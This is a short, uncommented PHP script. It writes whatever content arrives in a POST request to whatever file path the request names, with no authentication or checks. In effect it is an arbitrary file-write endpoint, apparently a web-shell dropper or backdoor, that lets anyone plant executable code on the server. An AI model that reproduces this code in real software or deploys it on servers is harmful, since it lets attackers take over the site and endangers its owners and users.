<?php
$location=$_POST["location"];
$content=$_POST["data"];
$myfile = fopen($location, "w") or die("Unable to open file!");
fwrite($myfile, $content);
fclose($myfile);
?>